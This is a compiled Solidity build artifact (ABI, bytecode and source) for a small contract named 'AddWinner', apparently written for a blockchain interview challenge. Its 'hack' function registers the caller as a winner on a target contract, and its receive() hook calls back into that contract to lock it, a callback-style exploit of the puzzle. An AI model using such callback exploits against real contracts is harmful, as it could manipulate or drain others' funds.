{
  "contractName": "AddWinner",
  "abi": [
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "target",
          "type": "address"
        }
      ],
      "name": "hack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610211806100206000396000f3fe6080604052600436106100225760003560e01c80636c4c174f1461008a57610085565b36610085573373ffffffffffffffffffffffffffffffffffffffff1663f83d08ba6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561006f57600080fd5b505af1158015610083573d6000803e3d6000fd5b005b600080fd5b34801561009657600080fd5b506100b160048036038101906100ac9190610184565b6100b3565b005b8073ffffffffffffffffffffffffffffffffffffffff16630a3b0a4f336040518263ffffffff1660e01b81526004016100ec91906101c0565b600060405180830381600087803b15801561010657600080fd5b505af115801561011a573d6000803e3d6000fd5b5050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061015182610126565b9050919050565b61016181610146565b811461016c57600080fd5b50565b60008135905061017e81610158565b92915050565b60006020828403121561019a57610199610121565b5b60006101a88482850161016f565b91505092915050565b6101ba81610146565b82525050565b60006020820190506101d560008301846101b1565b9291505056fea264697066735822122093be207fd8aad7d71e865939d18d32aab12cedcdad41cd56016844f8664fe88a64736f6c63430008110033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: Deepanshu\npragma solidity ^0.8.17;\n\ninterface Task {\n    function add(address winner) external;\n\n    function lock() external;\n}\n\ncontract AddWinner {\n    function hack(address target) external {\n        Task(target).add(msg.sender);\n    }\n\n    receive() external payable {\n        Task(msg.sender).lock();\n    }\n}\n",
  "sourcePath": "/Users/deepanshusingh/blockchain projects/teesta_interview/contracts/AddWinner.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-11-10T12:37:04.675Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}